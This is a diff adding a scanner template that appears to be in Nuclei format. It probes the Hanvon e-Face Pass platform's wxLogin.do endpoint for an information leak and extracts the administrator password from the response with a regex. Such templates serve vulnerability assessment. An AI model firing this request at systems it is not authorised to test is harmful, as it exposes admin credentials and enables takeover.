@@ -1,0 +1,36 @@
+id: poc-yaml-hw-e-face-pass-spmp-wxlogin-do-info-leak
+info:
+  name: 汉王e脸通综合管理平台 wxLogin.do 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 信息泄露
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/manage/m/wxLogin.do?openid=1&username=admin&password=1&id=1&flag=1"
+    matchers:
+      - type: word
+        words:
+          - "\"userName\":\"admin\""
+          - "超级管理员"
+          - "\"email\":"
+        condition: and
+      - type: regex
+        regex:
+          - "\"password\":\"([0-9a-z]+)\""
+      - type: word
+        words:
+          - "<"
+        negative: true
+    matchers-condition: and
+
+variables:
+  extracted_password:
+    - type: regex
+      regex:
+        - "\"password\":\"([0-9a-z]+)\""
+      group: 1
+      internal: true
+      part: body
+      description: Extracted password from response body.
